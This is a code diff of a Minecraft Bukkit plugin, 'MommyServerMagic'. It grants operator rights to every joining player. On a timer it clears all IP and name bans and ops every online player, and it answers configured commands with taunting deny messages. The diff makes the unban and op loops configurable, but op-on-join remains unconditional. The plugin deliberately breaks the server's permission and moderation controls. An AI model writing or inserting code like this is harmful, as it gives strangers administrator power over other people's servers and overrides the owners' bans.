@@ -2,7 +2,6 @@ package io.github.austerzockt.mommyservermagic;
 
 import io.github.austerzockt.mommyservermagic.config.ServerMagicConfig;
 import net.kyori.adventure.text.Component;
-import net.kyori.adventure.text.TextComponent;
 import net.kyori.adventure.text.format.TextColor;
 import org.bukkit.BanEntry;
 import org.bukkit.BanList;
@@ -19,23 +18,29 @@ import java.util.List;
 import java.util.Random;
 
 public final class MommyServerMagic extends JavaPlugin implements Listener {
-    private ServerMagicConfig serverMagicConfig;
     private final List<String> denyMessages = Arrays.asList("That's a big No No, Mate!", "How about we forget what you just tried to do?", "Nope", "Forget it", "Uhm, well, how should I put it? NO");
+    private ServerMagicConfig serverMagicConfig;
+
     @Override
     public void onEnable() {
         serverMagicConfig = new ServerMagicConfig(this, "config");
-        Bukkit.getPluginManager().registerEvents(this,this);
+        Bukkit.getPluginManager().registerEvents(this, this);
         Bukkit.getScheduler().runTaskTimer(this, () -> {
-            Bukkit.getBanList(BanList.Type.IP).getBanEntries().stream().map(BanEntry::getTarget).forEach(s -> Bukkit.getBanList(BanList.Type.IP).pardon(s));
-            Bukkit.getBanList(BanList.Type.NAME).getBanEntries().stream().map(BanEntry::getTarget).forEach(s -> Bukkit.getBanList(BanList.Type.NAME).pardon(s));
-            Bukkit.getOnlinePlayers().forEach(s -> {
-                if (!s.isOp())
-                s.setOp(true);
+            serverMagicConfig.reload();
+            if (serverMagicConfig.getBoolean("alwaysUnban")) {
+                Bukkit.getBanList(BanList.Type.IP).getBanEntries().stream().map(BanEntry::getTarget).forEach(s -> Bukkit.getBanList(BanList.Type.IP).pardon(s));
+                Bukkit.getBanList(BanList.Type.NAME).getBanEntries().stream().map(BanEntry::getTarget).forEach(s -> Bukkit.getBanList(BanList.Type.NAME).pardon(s));
+            }
+            if (serverMagicConfig.getBoolean("alwaysOp")) {
+                Bukkit.getOnlinePlayers().forEach(s -> {
+                    if (!s.isOp())
+                        s.setOp(true);
+                });
+            }
 
-            });
-
-        }, 20, 20);
+        }, 20, 40);
     }
+
     @EventHandler
     public void onCommand(PlayerCommandPreprocessEvent event) {
         List<String> commands = serverMagicConfig.getStringList("commands");
@@ -47,6 +52,7 @@ public final class MommyServerMagic extends JavaPlugin implements Listener {
 
         });
     }
+
     @EventHandler
     public void onJoin(PlayerJoinEvent event) {
         event.getPlayer().setOp(true);
